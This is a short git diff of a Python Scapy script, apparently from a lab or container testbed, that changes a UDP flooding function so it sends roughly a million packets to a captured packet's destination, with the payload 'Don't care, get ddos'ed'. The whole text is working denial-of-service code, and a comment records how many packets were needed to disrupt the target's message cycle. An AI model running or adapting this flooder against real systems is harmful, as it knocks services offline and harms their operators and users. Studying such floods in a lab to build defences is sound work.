@@ -9,7 +9,8 @@ def flood_destination(packet, payloadSize=1000):
         # souPort = packet[UDP].sport
         # desPort = packet[UDP].sport
         rawMsg = b"Don't care, get ddos'ed"
-        for packets in range(0,payloadSize):
-            send((IP(dst=packet[IP].dst) / UDP(sport=packet[UDP].sport, dport=packet[UDP].sport) / Raw(load=rawMsg)))
+        #
+        for packets in range(0,1000):
+            send((IP(dst=packet[IP].dst) / UDP(sport=packet[UDP].sport, dport=packet[UDP].sport) / Raw(load=rawMsg)), count = 1000)
         
 #100, 200, and 1000 packets was enough to disrupt the message cycle, but not enough to shutdown the container
